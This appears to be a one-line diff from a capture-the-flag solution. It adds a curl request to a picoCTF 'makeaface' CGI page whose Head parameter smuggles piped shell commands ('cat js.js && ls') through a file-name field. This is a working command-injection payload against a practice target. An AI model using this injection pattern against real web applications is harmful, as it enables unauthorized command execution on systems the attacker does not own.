@@ -1,0 +1,1 @@
+curl 'http://makeaface.picoctf.com/index.cgi?Head=%20head1.bmp%20%7C%20cat%20js.js%20%26%26%20ls%20%7C&Hair=1.bmp&Nose=2.bmp&Mouth=2.bmp&Eyes=2.bmp'
